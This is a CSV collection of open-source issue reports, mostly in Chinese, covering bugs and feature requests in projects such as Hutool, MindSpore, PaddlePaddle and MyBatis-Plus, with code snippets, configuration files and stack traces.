title,text
代码生成entity的toString有瑕疵,"当前使用版本 3.1.0 使用代码生成后，发现生成的entity的toString方法第一个参数前有逗号！   <code>: ""User{"" + "", id="" + id + "", roleId="" + roleId +"
手工创建作用域Scoped.Create后在作用域内部Throw抛出异常不会进入全局异常监控,"Furion 版本号 4.2.6 .NET SDK 版本号 .NET5 .NET6 .NET7 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 操作系统和版本 Windows Linux MacOS 其他 代码环境 开发环境（Development） 生产环境（Production） 测试环境 1、创建了作用域然后直接在作用域中抛出异常 2、全局的日志监控记录错误日志中不会被记录 无堆栈信息 必须提供完整可运行且包含错误的 仓库 DEMO，DEMO 提供最简单的错误逻辑代码，否则不予处理。 Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos 像作用域外部抛出异常一样正常记录   <code>: using Furion.DependencyInjection; using Furion.FriendlyException; using Furion; using Microsoft.AspNetCore.Mvc.Filters; using Furion.DynamicApiController; using Furion.Templates; using Microsoft.Extensions.Logging; Serve.Run(""http://0.0.0.0:8082""); public class actionFileApp : IDynamicApiController { public async Task&lt;string&gt; testApi() { string result = string.Empty; Scoped.Create((f, s) =&gt; { throw new Exception(""aaa""); }); return result; } } public class logHand : IGlobalExceptionHandler, ISingleton { public Task OnExceptionAsync(ExceptionContext context) { var log = App.GetService&lt;ILogger&lt;logHand&gt;&gt;(); log.LogError( TP.Wrapper(""错误异常日志全局拦截器记录"", ""运行过程中发生的异常信息拦截记录"", $""##错误消息## {context.Exception.Message}"", $""##堆栈信息## {context.Exception.StackTrace}"", $""##源信息## {context.Exception.Source}"", $""##方法## {context.Exception.TargetSite.Name}"", $""##ClassType## {context.Exception.TargetSite.DeclaringType?.FullName}"", $""##请求方法## {context.HttpContext.Request.Method}"", $""##请求地址## {context.HttpContext.Request.Path.Value}"")); return Task.CompletedTask; } }"
组数据提示数据源数量显示错误,"JDK版本: JDK 1.8 SpringBoot版本: 2.0.5 Starter版本: 2.4.2 当前的默认数据源是组数据源,组名为slave,其下有1个数据源 重现步骤 步骤1 步骤2 步骤3   <code>: spring: datasource: dynamic: primary: slave datasource: slave_1: username: 1 password: # driver-class-name: com.mysql.jdbc.Driver url: 123 slave_2: username: 1 password: # driver-class-name: com.mysql.jdbc.Driver url: 456"
hutool 对jdk9的支持,"使用hutool版本 在jdk9环境下报错: 请问hutool是否支持jdk9,或是本人使用不当?   <code>: &lt;dependency&gt; &lt;groupId&gt;cn.hutool&lt;/groupId&gt; &lt;artifactId&gt;hutool-all&lt;/artifactId&gt; &lt;version&gt;4.0.7&lt;/version&gt; &lt;/dependency&gt; Error:(11, 20) java: 找不到模块: hutool.all"
支持在@Query，@DataFile等注解中使用隐式变量 ${_it} 、 ${_index} 和 ${_key},"支持在@Query，@DataFile等注解中使用隐式变量 、 和 和 这两个变量仅在遇到Map、List、数组等集合类型参数时有效 迭代集合时，代表集合中的每一项对象 迭代集合时, 代表每次迭代的循环计数（从零开始计） 当遇到Map以及Map为基类的类型参数时，可以使用 迭代Map时，代表Map中每一次迭代中的键值   <code>: ${_it} ${_index} ${_key} ${_it} ${_index} _it _index ${_key} _key"
More data format support in SoftmaxMKLDNNKernel,"In , and only currently only NC data format is supported. More format should be supported when necessary. [removed TODO]   <code>: softmax_mkldnn_op.cc SoftmaxMKLDNNKernel SoftmaxMKLDNNGradKernel // TODO(jczaja): Add layouts support when there is a need to do so // Two dimensional softmax does support NC format"
ClassLoaderUtil 加载内部类抛出异常,"使用的JDK版本和Hutool版本： 1.8 ， 4.1.18 文档里面 写了 类加载器是支持 加载内部类的，可是它确抛出了异常！！ 内部类，例如：java.lang.Thread.State会被转为java.lang.Thread$State加载 System.out.println(ClassLoaderUtil.loadClass(""java.lang.Thread.State"").getName()); 这样就会报错了 原因 其实是支持加载内部类的，可是源码里面 加载成功之后，依然抛出了异常 也就是加载普通类catch异常之后， 尝试 加载内部类 异常忽略了， 但是抛出了 throw new UtilException(ex); 我 debug 了一下，发现内部类是可以加载出来的，但是 抛出了异常。 而且 内部类失败，应该抛出异常吧！！！   <code>: Exception in thread ""main"" cn.hutool.core.exceptions.UtilException: ClassNotFoundException: java.lang.Thread.State at cn.hutool.core.util.ClassLoaderUtil.loadClass(ClassLoaderUtil.java:190) at cn.hutool.core.util.ClassLoaderUtil.loadClass(ClassLoaderUtil.java:124) at cn.hutool.core.util.ClassLoaderUtil.loadClass(ClassLoaderUtil.java:105) at com.core.util.TestClassLoaderUtil.main(TestClassLoaderUtil.java:12) Caused by: java.lang.ClassNotFoundException: java.lang.Thread.State at java.net.URLClassLoader.findClass(URLClassLoader.java:381) at java.lang.ClassLoader.loadClass(ClassLoader.java:424) at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:335) at java.lang.ClassLoader.loadClass(ClassLoader.java:357) at java.lang.Class.forName0(Native Method) at java.lang.Class.forName(Class.java:348) at cn.hutool.core.util.ClassLoaderUtil.loadClass(ClassLoaderUtil.java:178) ... 3 more else { // 加载普通类 if (null == classLoader) { classLoader = getClassLoader(); } try { clazz = Class.forName(name, isInitialized, classLoader); } catch (ClassNotFoundException ex) { // 尝试获取内部类，例如java.lang.Thread.State =》java.lang.Thread$State int lastDotIndex = name.lastIndexOf(PACKAGE_SEPARATOR); if (lastDotIndex &gt; 0) {// 类与内部类的分隔符不能在第一位，因此&gt;0 final String innerClassName = name.substring(0, lastDotIndex) + INNER_CLASS_SEPARATOR + name.substring(lastDotIndex + 1); try { clazz = Class.forName(innerClassName, isInitialized, classLoader); } catch (ClassNotFoundException ex2) { // 尝试获取内部类失败时，忽略之。 } } throw new UtilException(ex); } }"
[MS] [unet3d] [CPU] unet3d模型中，prelu算子和conv3dtranspose算子不支持cpu，并且自定义算子无法使用,"unet3d模型中使用的prelu算子和conv3dtranspose算子不支持cpu。 RuntimeError: mindspore\ccsrc\plugin\device\cpu\hal\device\kernel_select_cpu.cc:193 KernelNotSupportException] Unsupported op [PReLU] on CPU, Please confirm whether the device target setting is correct, or refer to the official website to query the operator support list. RuntimeError: mindspore\ccsrc\plugin\device\cpu\hal\device\kernel_select_cpu.cc:193 KernelNotSupportException] Unsupported op [Conv3DTranspose] on CPU, Please confirm whether the device target setting is correct, or refer to the official website to query the operator support list. 自定义了prelu_cpu_kernel.cc, prelu_cpu_kernel.h, prelu_grad_cpu_kernel.cc和prelu_grad_cpu_kernel.h四个算子文件，其中prelu_grad_cpu_kernel.cc报错   <code>: set(onednn_CXXFLAGS ""-D_FORTIFY_SOURCE=2 -O2"") set(onednn_CFLAGS ""-D_FORTIFY_SOURCE=2 -O2"") if(NOT MINDSPORE_PROJECT_DIR) set(MINDSPORE_PROJECT_DIR ${CMAKE_SOURCE_DIR}) endif() if(USE_MS_THREADPOOL_FOR_DNNL) set(USE_MS_THREADPOOL ""-DDNNL_CPU_RUNTIME=THREADPOOL"") else() set(USE_MS_THREADPOOL """") endif() if(ENABLE_GITEE_EULER) set(GIT_REPOSITORY ""git@gitee.com:src-openeuler/onednn.git"") set(GIT_TAG ""0d726f1"") set(MD5 ""6a062e36ea1bee03ff55bf44ee243e27"") __download_pkg_with_git(ONEDNN ${GIT_REPOSITORY} ${GIT_TAG} ${MD5}) set(ONE_DNN_SRC ""${TOP_DIR}/mindspore/lite/build/_deps/onednn-src"") execute_process(COMMAND tar -xf ${ONE_DNN_SRC}/v2.6.tar.gz --strip-components 1 -C ${ONE_DNN_SRC}) endif() if(CMAKE_SYSTEM_NAME MATCHES ""Windows"") mindspore_add_pkg(onednn VER 2.6 LIBS dnnl mkldnn HEAD_ONLY ./include RELEASE on URL http://tools.mindspore.cn/libs/dnnl/dnnl_win_2.2.0_cpu_vcomp.zip MD5 139fcdbd601a970fb86dd15b30ba5ae3) else() if(ENABLE_GITEE) set(REQ_URL ""https://gitee.com/mirrors/MKL-DNN/repository/archive/v2.6.tar.gz"") set(MD5 ""204e1b02b14124a81f31bcc2115f5776"") else() set(REQ_URL ""https://github.com/oneapi-src/oneDNN/archive/v2.6.tar.gz"") set(MD5 ""2ef4cf81912f55abfe1d45bb14a33c1c"") endif() mindspore_add_pkg(onednn VER 2.6 LIBS dnnl mkldnn URL ${REQ_URL} MD5 ${MD5} CMAKE_OPTION -DDNNL_ARCH_OPT_FLAGS='' -DDNNL_BUILD_EXAMPLES=OFF -DDNNL_BUILD_TESTS=OFF ${USE_MS_THREADPOOL} -DDNNL_ENABLE_CONCURRENT_EXEC=ON) endif() include_directories(${onednn_INC}) add_library(mindspore::dnnl ALIAS onednn::dnnl) add_library(mindspore::mkldnn ALIAS onednn::mkldnn)"
Rename OpProtoAndCheckerMaker to OpInfoMaker,"is too long and hard to understand. Change it to , because it actually fill fields in   <code>: OpProtoAndCheckerMaker OpInfoMaker OpInfo"
mapper允许传入空值的问题,"mapper接口如果要插入一个空值使得数据库的字段值为null的话。 在调用mapper接口方法上有什么办法可以让updateByPrimaryKeySelective 不忽略这种null赋值？ //test3 的运行产生sql 相当于是把全面字段都update一遍。这种情况下，update set 中有包含check_by=？ 和check_date=？ 两个属性 但是这种调用，会把对象的全部属性字段都更新一遍（这个PcInfo还有很多属性，就不列举了）~不能选择性更新。 //test4 运行结果，产生sql 为 update pc_info set id=? where id=? 。会自动忽略了check_by和check_date， XXXSelective这类接口，如何才能设置null值呢？？   <code>: @Test public void test3() throws Exception { PcInfo info = pcInfoMapper.selectByPrimaryKey(61); // info.setId(61); info.setCheckBy(null); info.setCheckDate(null); int res = pcInfoMapper.updateByPrimaryKey(info); System.out.println(""更新数量="" + res); } @Test public void test4() throws Exception { PcInfo info = new PcInfo(); info.setId(61); info.setCheckBy(null); info.setCheckDate(null); int res = pcInfoMapper.updateByPrimaryKeySelective(info); System.out.println(""更新数量="" + res); }"
静态图缺少对应fluid.layers.brelu的接口,PaddlePaddle 2.1.0 paddle.static.nn 缺少这个接口：   <code>: fluid.layers.brelu
【请教】自定义SQL分页查询报错Could not set parameters for mapping,"自定义SQL实现分页查询。传入查询条件就会报错。不传查询条件不报错。 dao xml 测试截图   <code>: IPage&lt;MatterInOutStockSumBean&gt; matterInOutStockSum( IPage&lt;MatterInOutStockSumBean&gt; page, @Param(""m"") MatterInOutSumFormBean m); &lt;select id=""matterInOutStockSum"" resultType=""com.tangyh.lamp.wms.dto.MatterInOutStockSumBean""&gt; SELECT m.`id` AS matterId, m.`name` AS matterName, m.`matter_type` AS matterType, m.`matter_no` AS matterNo, m.`model` AS model, IFNULL(a.stock_quantity, 0) AS stockQuantity, IFNULL(b.`quantity`, 0) AS quantity, IFNULL(c.`quantity`, 0) AS quantity FROM `e_wms_matter` m LEFT JOIN ( SELECT s.`matter_id` AS matter_id, SUM(s.stock_quantity) AS stock_quantity FROM `e_wms_stock` s GROUP BY s.`matter_id` ) a ON m.id = a.`matter_id` LEFT JOIN ( SELECT d.`matter_id` AS matter_id, SUM(d.`quantity`) AS quantity FROM `e_wms_order_detail` d WHERE d.`order_direction` = 'IN' &lt;if test=""null != m.startTime""&gt; AND d.`create_time` &amp;gt;= #{m.startTime} &lt;/if&gt; &lt;if test=""null != m.endTime""&gt; AND d.`create_time` &amp;lt; #{m.endTime} &lt;/if&gt; &lt;if test=""null != m.matterType""&gt; AND d.`matter_type` = #{m.matterType} &lt;/if&gt; GROUP BY d.`matter_id` ) b ON m.id = b.`matter_id` LEFT JOIN ( SELECT d.`matter_id` AS matter_id, SUM(d.`quantity`) AS quantity FROM `e_wms_order_detail` d WHERE d.`order_direction` = 'OUT' &lt;if test=""null != m.startTime""&gt; AND d.`create_time` &amp;gt;= #{m.startTime} &lt;/if&gt; &lt;if test=""null != m.endTime""&gt; AND d.`create_time` &amp;lt; #{m.endTime} &lt;/if&gt; &lt;if test=""null != m.matterType""&gt; AND d.`matter_type` = #{m.matterType} &lt;/if&gt; GROUP BY d.`matter_id` ) c ON m.id = c.`matter_id` &lt;/select&gt;"
[CT][MS][HammingWindow]GPU下输入length的类型为int8，int16，uint8，uint16，uint32，uint64时报TypeError,"输入length的类型为int8，int16，uint8，uint16，uint32，uint64时报TypeError input为IntegerDataType，应该都支持 mode graph   <code>: ''' TEST_SUMMARY: test hamming_window with all attributes default, input dtype=int usually used ''' def test_hamming_window_input_int8_attr_all_default_001(): int_dtype = [np.int16, np.int32, np.int64] for dtype in int_dtype: length = (Tensor(np.random.randint(0, 128, size=1).astype(dtype))) fact = HammingWindowMock(attributes={}, inputs=[length]) fact.forward_cmp() ''' TEST_SUMMARY: test hamming_window with all attributes default, input dtype=int unusual ''' def test_hamming_window_input_int8_attr_all_default_002(): int_dtype = [np.int8, np.uint8, np.uint16, np.uint32, np.uint64] for dtype in int_dtype: length = (Tensor(np.random.randint(0, 128, size=1).astype(dtype))) fact = HammingWindowMock(attributes={'alpha': 0.78, 'beta': 0.44}, inputs=[length]) fact.forward_cmp() E TypeError: Select GPU operator[HammingWindow] fail! Unsupported data type! E The supported data types are input[Int32], output[Float16]; input[Int64], output[Float16]; input[Int32], output[Float32]; input[Int64], output[Float32]; input[Int32], output[Float64]; input[Int64], output[Float64]; , but get input[UInt8 ] output[Float32 ] E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/plugin/device/gpu/hal/hardware/gpu_device_context.cc:534 SetOperatorInfo /root/miniconda3/envs/zhanglin3.7/lib/python3.7/site-packages/mindspore/common/api.py:1120: TypeError ### Environment / 环境信息 (Mandatory / 必填) - **Hardware Environment(`Ascend`/`GPU`/`CPU`) / 硬件环境**: device GPU - **Software Environment / 软件环境 (Mandatory / 必填)**: -- MindSpore version (e.g., 1.7.0.Bxxx) : -- Python version (e.g., Python 3.7.5) : -- OS platform and distribution (e.g., Linux Ubuntu 16.04): -- GCC/Compiler version (if compiled from source): - **Excute Mode / 执行模式 (Mandatory / 必填)(`PyNative`/`Graph`)**: mode pynative mode graph ### Related testcase / 关联用例 (Mandatory / 必填) ### Steps to reproduce the issue / 重现步骤 (Mandatory / 必填) 1. 2. 3. ### Describe the expected behavior / 预期结果 (Mandatory / 必填) ### Related log / screenshot / 日志 / 截图 (Mandatory / 必填) ### Special notes for this issue/备注 (Optional / 选填)"
MasterSlaveAutoRoutingPlugin 读没选择从库,"我试了好几个版本，都说一样的。 我只有2个库，进行读写分离，安装官方配置了MasterSlaveAutoRoutingPlugin后，发现只有写进入其中，而读根本不进入这个类，直接就选择了默认的库。 就这些，包版本：2.5.6,2.5.7都试了的   <code>: @Configuration public class MybatisCongfig { /** * 分页插件 */ @Bean public PaginationInterceptor paginationInterceptor() { return new PaginationInterceptor(); } @Bean public MasterSlaveAutoRoutingPlugin masterSlaveAutoRoutingPlugin(){ return new MasterSlaveAutoRoutingPlugin(); } } spring: datasource: dynamic: primary: master datasource: master: driver-class-name: com.mysql.cj.jdbc.Driver # JDBC连接Mysql6以上com.mysql.cj.jdbc.Driver url: jdbc:mysql://192.168.9.246:3306/bitbuy-dev?useSSL=false&amp;serverTimezone=GMT%2B8&amp;useUnicode=true&amp;characterEncoding=utf8 username: password: slave: driver-class-name: com.mysql.cj.jdbc.Driver # JDBC连接Mysql6以上com.mysql.cj.jdbc.Driver url: jdbc:mysql://192.168.9.247:3306/bitbuy-dev?useSSL=false&amp;serverTimezone=GMT%2B8&amp;useUnicode=true&amp;characterEncoding=utf8 username: password:"
@ApiModelProperty(hidden = true) GET下失效,"最新版本。 如 POST用json接受没问题， 在GET下文档里会显示出来， 期望hidden 的不显示   <code>: @ApiOperation(""收入统计"") @GetMapping(""/finance/statistic"") public R&lt;ArchivedOrderDetailDay&gt; financeStatistics(StatisticsMoneyDto dto) { return R.ok(xxxService.xxx(dto)); } @Data @Accessors(chain = true) public class StatisticsMoneyDto { @ApiModelProperty(value = ""查询开始时间"", example = ""2018-10-01 00:00:00"") @NotNull private LocalDateTime from; @ApiModelProperty(value = ""查询结束时间"", example = ""2018-10-30 00:00:00"") @NotNull private LocalDateTime to; @ApiModelProperty(value = ""停车点ID(非必传)"") private Long parkingLotId; @ApiModelProperty(hidden = true) private LocalDate startDate; @ApiModelProperty(hidden = true) private LocalDate endDate; @ApiModelProperty(hidden = true) private YearMonth startMonth; @ApiModelProperty(hidden = true) private YearMonth endMonth; public LocalDate getStartDate() { return from.toLocalDate(); } public LocalDate getEndDate() { return to.toLocalDate(); } public YearMonth getStartMonth() { return YearMonth.of(from.getYear(), from.getMonth()); } public YearMonth getEndMonth() { return YearMonth.of(to.getYear(), to.getMonth()); } }"
pigx-ui的一个文件无法上传到软件发布库,"pigx版本: 3.2 是否二开: 否 是否修改包名: 否   <code>: 这个文件的名字不符合华为云构建后上传到软件发布库的规范，这个文件是在哪引用的？能不能修改这个文件的名字和引用 文件位置pigx-ui\public\images\media_dialog&amp;emotion_editor&amp;msg_tab&amp;emoji&amp;msg_sender&amp;tooltip.css.bak 华为云 上传软件包到软件发布库 日志： [2019-08-30 10:08:20.358] [ERROR] [上传软件包到软件发布库:上传软件包] : DEV.CB.0236, Releaseman error: {""result"":null,""error"":{""code"":""DEV-CR-40016"",""reason"":""名称不能为空,支持中文,英文,数字,下划线(_),连字符(-)和点(.),长度200字符以内。非法名称:media_dialog&amp;emotion_editor&amp;msg_tab&amp;emoji&amp;msg_sender&amp;tooltip.css.bak""},""status"":""error""}"
JSONArray toList方法异常,"JDK版本： openjdk_8 hutool版本： 5.1.0 在toList之后,vccList长度没问题,但是每个元素都是null   <code>: [""{\""updateDate\"":1583376342000,\""code\"":\""move\"",\""id\"":1,\""sort\"":1,\""name\"":\""电影大全\""}"",""{\""updateDate\"":1583378882000,\""code\"":\""zy\"",\""id\"":3,\""sort\"":5,\""name\"":\""综艺会\""}""] //这里list的json数据在上方 List&lt;String&gt; redisList = redisUtil.lRange(key, 0, redisUtil.lLen(key)); List&lt;vcc&gt; vccList =JSONUtil.parseArray(JSONUtil.toJsonStr(redisList)).toList(vcc.class); import java.io.Serializable; import com.baomidou.mybatisplus.annotation.IdType; import com.baomidou.mybatisplus.annotation.TableId; import lombok.*; import java.util.Date; import java.util.List; @Data @NoArgsConstructor @AllArgsConstructor @Builder @EqualsAndHashCode public class vcc implements Serializable { private static final long serialVersionUID = 1L; @TableId(value = ""id"",type = IdType.AUTO) private Long id; private Date updateDate; private String code; private String name; private Integer sort; }"
同样的参数，layer.photos可以正常使用，但是top.layer.photos没反应,"实际需求：先layer.open打开一个help弹窗，再从help弹窗中显示一些图片示例。但是由于会自动基于父窗口缩略，所以要设置基于顶层显示。 图片参数固定，如： 一样的参数，一开始 layer.photos 使用的时候没问题，但是不符合实际需求。改成 top.layer.photos 后无效。 调试发现，参数传入layer后进行判断（源码1071行） 该判断在默认情况下得到结果是true，但是在top.调用的时候却一直得到结果为false，甚至在上面定义photo参数的时候加入 constructor: Object 都没有用。 但是调试时分析参数应该是object没问题，不知为何会导致这种情况。   <code>: { ""title"": """", ""id"": 1, ""start"": 0, ""data"": [ { ""alt"": ""图1"", ""pid"": 1, ""src"": ""resources/img/操作演示.gif"", ""thumb"": """" } ] } var type = options.photos.constructor === Object;"
[BUG]:X3.4版本全新安装，UCenter进不去。,"全新安装X3.4版本，系统环境: 操作系统: PHP Mysql BUG截图:   <code>: lsb_release -a No LSB modules are available. Distributor ID: Ubuntu Description: Ubuntu 16.04 LTS Release: 16.04 Codename: xenial php --version PHP 7.0.22-0ubuntu0.16.04.1 (cli) ( NTS ) Copyright (c) 1997-2017 The PHP Group Zend Engine v3.0.0, Copyright (c) 1998-2017 Zend Technologies with Zend OPcache v7.0.22-0ubuntu0.16.04.1, Copyright (c) 1999-2017, by Zend Technologies mysql --version mysql Ver 14.14 Distrib 5.7.20, for Linux (x86_64) using EditLine wrapper"
"tpl模板中js代码if判断多个条件使用“&&”时，&会被转义成""&amp;""而报错",。tpl模板中js代码if判断多个条件使用“&amp;&amp;”时，&amp;会被转义成“&amp;amp”而报错，这里是不允许多个条件同时判断，还是有其他模板使用方式。   <code>: templet:'&lt;div&gt;{{# if(d.A &amp;&amp; d.B) return A; return B;}}&lt;/div&gt;'
下载失败后，流程／逻辑不正确。,"Spider的run()方法。 其中的processRequest方法中通过Page的downloadSuccess来判断下载是否成功。 这一属性，只在HttpClientDownloader中设置了。但PhantomJSDownloader并没有修改（始终为true）。 Downloader下载失败后，pageCount也会增加，显示Spider ｘｘｘ closed! N pages downloaded.其中，N=cycleRetryTimes。 同时，RedisScheduler中已有标记，导致再次启动同一任务后，会被去重（失败的任务，应当消除标记）。   <code>: try { processRequest(request); onSuccess(request); } catch (Exception e) { onError(request); logger.error(""process request "" + request + "" error"", e); } finally { pageCount.incrementAndGet(); signalNewUrl(); } private void processRequest(Request request) { Page page = downloader.download(request, this); if (page.isDownloadSuccess()){ onDownloadSuccess(request, page); } else { onDownloaderFail(request); } }"
[CT][MS][doc][value_and_grad] 对应官网测试样例中，有语法错误,"1, 官网链接： https://www.mindspore.cn/docs/en/master/api_python/ops/mindspore.ops.value_and_grad.html?highlight=value_and_grad#mindspore.ops.value_and_grad 对应算子测试样例中有语法错误， y = Tensor([-2, 3]), mindspore.float32) z = Tensor([0, 3]), mindspore.float32) 这里面多个右括号“）” /mode graph   <code>: _______________________________________________________ [doctest] mindspore.ops.function.grad.grad_func.value_and_grad _______________________________________________________ 234 [0. 6.] 235 &gt;&gt;&gt; 236 &gt;&gt;&gt; # Function object to be differentiated 237 &gt;&gt;&gt; def fn(x, y, z): 238 ... res = x * ops.exp(y) * ops.pow(z, 2) 239 ... return res, z 240 &gt;&gt;&gt; x = Tensor(np.array([3, 3]).astype(np.float32)) 241 &gt;&gt;&gt; y = Tensor(np.array([0, 0]).astype(np.float32)) 242 &gt;&gt;&gt; z = Tensor(np.array([5, 5]).astype(np.float32)) 243 &gt;&gt;&gt; output, inputs_gradient = value_and_grad(fn, grad_position=(1, 2), weights=None, has_aux=True)(x, y, z) UNEXPECTED EXCEPTION: NameError(""The name 'ops' is not defined, or not supported in graph mode.\n\n----------------------------------------------------\n- The Traceback of Net Construct Code:\n----------------------------------------------------\n\n# In file &lt;doctest mindspore.ops.function.grad.grad_func.value_and_grad[13]&gt;(2)\n\n----------------------------------------------------\n- C++ Call Stack: (For framework developers)\n----------------------------------------------------\nmindspore/ccsrc/pipeline/jit/parse/function_block.cc:309 HandleBuiltinNamespaceInfo\n"") Traceback (most recent call last): File ""/root/miniconda3/envs/op3.7/lib/python3.7/doctest.py"", line 1329, in __run compileflags, 1), test.globs) File ""&lt;doctest mindspore.ops.function.grad.grad_func.value_and_grad[17]&gt;"", line 1, in &lt;module&gt; File ""/root/miniconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 600, in staging_specialize out = _MindsporeFunctionExecutor(func, hash_obj, input_signature, process_obj, jit_config)(*args) File ""/root/miniconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 98, in wrapper results = fn(*arg, **kwargs) File ""/root/miniconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 404, in __call__ phase = self.compile(args_list, self.fn.__name__) File ""/root/miniconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 378, in compile is_compile = self._graph_executor.compile(self.fn, compile_args, phase, True) NameError: The name 'ops' is not defined, or not supported in graph mode. ---------------------------------------------------- - The Traceback of Net Construct Code: ---------------------------------------------------- # In file &lt;doctest mindspore.ops.function.grad.grad_func.value_and_grad[13]&gt;(2) ---------------------------------------------------- - C++ Call Stack: (For framework developers) ---------------------------------------------------- mindspore/ccsrc/pipeline/jit/parse/function_block.cc:309 HandleBuiltinNamespaceInfo"
Paddle多机分布式训练出错,"大家好！ root@3374a3140ee5:/app/ap/recognize_digits# PADDLE_TRAINING_ROLE=TRAINER PADDLE_PSERVER_IPS=ps0.paddlepaddle.com,ps1.paddlepaddle.com PADDLE_TRAINERS=2 PADDLE_TRAINER_ID=1 PADDLE_PSERVER_PORT=6174 python fluid_dist.py F0720 09:45:08.417428 591 grpc_client.cc:276] Send name:[fc_0.b_0@GRAD.trainer_1], ep:[ps1.paddlepaddle.com:6174] meets grpc error:Deadline Exceeded *** Check failure stack trace: *** @ 0x7f69cdad679d google::LogMessage::Fail() @ 0x7f69cdada24c google::LogMessage::SendToLog() @ 0x7f69cdad62c3 google::LogMessage::Flush() @ 0x7f69cdadb75e google::LogMessageFatal::~LogMessageFatal() @ 0x7f69ce2e16ef paddle::operators::distributed::GRPCClient::Proceed() @ 0x7f69d8856c80 (unknown) @ 0x7f6a198526ba start_thread @ 0x7f6a1958841d clone @ (nil) (unknown) Aborted (core dumped) 172.17.0.9 ps0.paddlepaddle.com 172.17.0.10 ps1.paddlepaddle.com 172.17.0.11 trainer0.paddlepaddle.com 172.17.0.12 trainer1.paddlepaddle.com   <code>: 这两天在尝试使用PaddlePaddle平台。之前按照操作说明单机训练可以有结果，但是进行多机训练时出错。 按照 http://www.paddlepaddle.org/docs/0.14.0/documentation/fluid/zh/new_docs/user_guides/howto/training/cluster_quick_start.html 这个文档进行的操作。 报错信息如下： 我是在docker里面进行操作的。 启用了4个docker实例，模拟4个主机。 /etc/hosts 里面配置如下： 4个docker实例可以互相访问，端口都打开着。 大家在多机训练时是怎么做的。有人遇到过类似的问题吗？希望得到高手指点，在此先谢过了！"
新版本异步校验问题,"在2.7.5版本中，只要一更改form表单的disabled状态，就会触发async-validator。而这些校验如果是向后台发送请求来进行验证的话，体验非常不好，在avue-cli中用的2.5.3版本就没有这个问题。以form-detail.vue这个文件做测试。控制台会打印出validator方法的内容   <code>: &lt;template&gt; &lt;basic-container&gt; &lt;h3&gt;{{$route.query.id?'编辑':'新增'}}&lt;/h3&gt; &lt;avue-form :option=""option"" v-model=""form""&gt; &lt;template slot=""menuForm""&gt; &lt;el-button icon=""el-icon-back"" @click=""handleBack()""&gt;返 回&lt;/el-button&gt; &lt;/template&gt; &lt;/avue-form&gt; &lt;/basic-container&gt; &lt;/template&gt; &lt;script&gt; export default { data () { let validateName = (rule, value, callback) =&gt; { console.log(value) callback() } return { form: {}, option: { disabled: true, labelWidth: 110, group: [{ column: [ { label: ""姓名"", prop: ""name"", rules: [ { required: true, message: '名称必填', trigger: 'blur', }, {validator: validateName, trigger: 'blur'} ], } ] }] } }; }, watch: { $route () { this.$message.success('路由更新id=' + this.$route.query.id) } }, methods: { handleBack () { // this.$router.$avueRouter.closeTag(); // this.$router.back(); this.option.disabled = (!this.option.disabled) } } }; &lt;/script&gt; &lt;style&gt; &lt;/style&gt;"
